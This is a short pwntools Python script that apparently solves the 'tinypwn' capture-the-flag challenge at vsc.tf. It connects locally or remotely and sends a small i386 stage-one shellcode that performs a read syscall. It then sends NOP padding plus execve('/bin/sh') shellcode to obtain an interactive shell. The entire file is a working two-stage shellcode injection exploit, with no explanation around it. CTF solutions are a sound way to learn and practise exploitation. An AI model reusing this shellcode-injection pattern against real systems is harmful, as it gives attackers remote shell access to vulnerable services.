#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

# elf = context.binary = ELF("./tinypwn", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc vsc.tf 3026"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process(["./tinypwn"] + argv, env=env, *a, **kw)


env = {}
io = start()

sc = asm("""
push 0xff
pop edx
push 0x3
pop eax
int 0x80
""", arch="i386", os="linux")

io.send(sc)

sh = shellcraft.i386.linux.execve("/bin/sh", 0, 0)
time.sleep(0.2)
io.send(b"\x90" * len(sc) + asm(sh))

io.interactive()
